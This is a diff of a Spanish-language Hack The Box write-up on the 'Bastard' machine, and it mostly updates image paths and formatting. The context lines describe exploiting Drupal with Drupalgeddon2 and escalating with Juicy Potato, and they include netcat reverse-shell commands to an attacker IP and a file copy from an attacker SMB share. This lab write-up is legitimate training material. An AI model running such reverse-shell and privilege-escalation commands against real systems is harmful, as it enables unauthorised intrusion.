@@ -18,15 +18,16 @@ tags:
 ---
 
 # Bastard
-
-![Untitled](Bastard%20d7489/Untitled.png)
+<p align="center">
+<img src="/assets/images/2022-02-14-writeup-maquina-htb-bastard/Untitled.png">
+</p>
 
 ## Resumen
-
+<div style="text-align: justify">
 La maquina Bastard es una maquina windows - Medium, comenzamos revisando la pagina web y vemos que se esta usando un cms que es Drupal 7.54, logramos ejecutar comandos usando el exploit Drupalgeddon2. Por ultimo logramos escalamos privilegios ya que ejecutando el comando whoami /priv vemos que tenemos el privilegio SeImpersonatePrivilege activado. Por lo tanto usamos el exploit juicy potato para abusar de ese privilegio y podes escalar privilegios como nt authority system
+</div>
 
 ## Scan Nmap
-
 ```bash
 # Nmap 7.92 scan initiated Thu Feb 17 08:20:32 2022 as: nmap -sC -sV -p80,135,49154 -oN targeted -Pn -vvv 10.129.143.4
 Nmap scan report for 10.129.143.4
@@ -64,7 +65,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 revisamos el puerto 80 tenemos una pagina web que usa Drupal
 
-![Untitled](Bastard%20d7489/Untitled%201.png)
+![Untitled](/assets/images/2022-02-14-writeup-maquina-htb-bastard/Untitled%201.png)
 
 escaneando los directorios no nos muestre nada en especial
 
@@ -298,7 +299,7 @@ drupalgeddon2>> C:\Windows\Temp\abeljm\nc.exe -e cmd.exe 10.10.14.70 443
 
 obteniendo una reverse shell
 
-![Untitled](Bastard%20d7489/Untitled%202.png)
+![Untitled](/assets/images/2022-02-14-writeup-maquina-htb-bastard/Untitled%202.png)
 
 ## Escalacion de privilegios
 
@@ -351,6 +352,6 @@ C:\Windows\Temp\abeljm>copy \\10.10.14.70\shared\jp.exe C:\Windows\Temp\abeljm\j
 C:\Windows\Temp\abeljm>jp.exe -l 1337 -p cmd.exe -a "/c C:\Windows\Temp\abeljm\nc.exe -e cmd.exe 10.10.14.70 443" -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}
 ```
 
-![Untitled](Bastard%20d7489/Untitled%203.png)
+![Untitled](/assets/images/2022-02-14-writeup-maquina-htb-bastard/Untitled%203.png)
 
 gracias por leer este writeup, AbelJM
